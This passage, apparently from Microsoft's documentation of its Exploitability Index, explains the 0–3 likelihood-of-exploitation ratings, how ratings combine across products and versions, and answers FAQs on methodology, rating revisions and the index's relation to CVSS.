| 3 | Exploitation unlikely \*\*\* |

### 0 – Exploitation Detected

Microsoft is aware of an instance of this vulnerability being exploited. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with the highest priority.

### 1 – Exploitation More Likely

Microsoft analysis has shown that exploit code could be created in such a way that an attacker could consistently exploit this vulnerability. Moreover, Microsoft is aware of past instances of this type of vulnerability being exploited. This would make it an attractive target for attackers, and therefore more likely that exploits could be created. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with a higher priority.

### 2 – Exploitation Less Likely

Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.

### 3 – Exploitation Unlikely

Microsoft analysis shows that successfully functioning exploit code is unlikely to be utilized in real attacks. This means that while it might be possible for exploit code to be released that could trigger the vulnerability and cause abnormal behavior, the full impact of exploitation will be more limited. Moreover, Microsoft has not observed instances of this type of vulnerability being actively exploited in the past. Thus, the actual risk of being exploited from this vulnerability is significantly lower. Therefore, customers who have reviewed the security update to determine its applicability within their environment could prioritize this update below other vulnerabilities within a release.

In those scenarios where multiple product series are affected, for instance a vulnerability that affects both Windows and Office, the rating reflects the highest risk level across both products. Likewise, the rating reflects the highest risk present across all versions of the product.  In this case, if the Exploitability Assessment on the latest version of Office is "1," and on the latest version of Windows is "2," the rating will reflect "1."  If the XI rating for Windows 10 version 2004 is “2” and the rating for Windows 7 is “1”, the rating will reflect “1”.

## Important Terms and Definitions

**Exploit Code** – A software program or sample code that, when executed against a vulnerable system, uses the vulnerability to spoof attacker identity, tamper with user or system information, repudiate attacker action, disclose user or system information on the server side, deny service to valid users, or elevate privileges for the attacker. For example, if a vulnerability had a security impact of remote code execution, Exploit Code could cause remote code execution to occur when run against a target system.

**Trigger a Vulnerability** – The ability to reach the vulnerable code, but not always achieving the maximum impact. For example, it may be easy to trigger a remote code execution vulnerability, but the resulting effect may only be a denial of service.

* ### What is the Microsoft Exploitability Index?

  The Microsoft Exploitability Index provides additional information to help customers prioritize their deployment of the monthly security updates. Microsoft designed this index to provide customers guidance concerning the likelihood of exploitation, based on each vulnerability addressed by Microsoft security updates.
* ### Why did Microsoft create the Exploitability Index?

  Customers asked for more information to help them prioritize their deployment of Microsoft security updates each month, specifically requesting details about the likelihood of exploitation for the vulnerabilities addressed in security updates. The Exploitability Index provides guidance about the actual risk of exploitation of a vulnerability at the time of the security update’s release.
* ### How are vulnerabilities rated?

  Microsoft Exploitability Index focuses on two aspects of a vulnerability to build its ratings:
  1. Current exploitation trends, based on telemetry data and awareness of exploitation of a particular type of vulnerability in a particular product,
  2. The cost and reliability of building a working exploit for the vulnerability, based on a technical analysis of the vulnerability.
* ### Is this a truly reliable rating system?

  While reliably predicting activity within the security ecosystem is always difficult, there are three reasons why this system should be useful. First, over the last few years we have realized that many security researchers analyze the updates associated with Microsoft's security updates the day they are released to create and evaluate protections. In doing so, many of these researchers also create exploit code to test them. The methodology used to develop this exploit code is like the one Microsoft uses to determine the likelihood of exploit code release. Microsoft analyzes the updates themselves, the nature of the vulnerability, and the conditions that must be met for an exploit to execute successfully. Second, not all vulnerabilities resolved by our security updates are exploited. A vulnerability may well be technically exploitable with a high degree of reliability, but it may never be exploited. We continuously monitor and track exploitation activity to keep up to date with current trends. This in turn informs our opinion of what constitutes a more attractive vulnerability over similar vulnerabilities, and enables us to more accurately communicate an actual risk, rather than a potential one from the vulnerabilities we patch.
  Finally, we are also partnering with protection providers through the Microsoft Active Protections Program (MAPP), working with them to help validate our predictions each month – thereby using a community approach to ensure better accuracy through information sharing.
* ### How is the Exploitability Index different from the Security Update Severity Rating system?

  The Security Update Severity Rating System assumes that exploitation will be successful. For some vulnerabilities where exploitability is high, this assumption is very likely to be true for a broad set of attackers. For other vulnerabilities where exploitability is low, this assumption may only be true when a dedicated attacker puts a lot of resources into ensuring their attack is successful. Regardless of the Severity or Exploitability Index rating, Microsoft always recommends that customers deploy all applicable and available updates; however, this rating information can assist sophisticated customers in prioritizing their approach to each month's release.
* ### How are Denial of Service, Tampering, Information Disclosure, or Spoofing issues rated?

  The Exploitability Index does not differentiate between vulnerability types. It focuses on the likelihood of exploitation of each vulnerability within the range of their full impact potential. Thus, any vulnerability, whether it is Remote Code Execution, Tampering or other, could be rated any of the Exploitability Index ratings.
* ### What happens when newly emerging information requires an update to the Exploitability Index rating?

  The ability to rate the possible exploitation of vulnerabilities is an evolving science, and new techniques for exploitation in general, or unique techniques specific to a vulnerability, or new trends in detected exploits of particular products may be discovered that could change the Exploitability Index rating. However, the goal of the Exploitability Index is to help customers prioritize those updates for the most current monthly release. Therefore, if there is information that would change an assessment released in the first month of a security release, Microsoft will update the Exploitability Index. If information becomes available in subsequent months, after most customers have made their prioritization decisions, the Exploitability Index will not be updated as it is no longer useful to the customer. When an Exploitability Index rating is corrected in a way that reflects increased risk to customers, the security update revision is incremented at a major version number (for instance, from 1.0 to 2.0). When risk is adjusted downwards, the update revision is incremented at a minor version number (for instance, from 1.0 to 1.1).
* ### How does the Exploitability Index relate to the Common Vulnerability Scoring System (CVSS) and other rating systems?

  The Exploitability Index is separate and not related to other rating systems. However, the MSRC is a contributing member to the Common Vulnerability Scoring System (CVSS), and Microsoft shares its experience and customer feedback in building and releasing the Exploitability Index with the working group in order to help ensure the CVSS is effective and actionable.
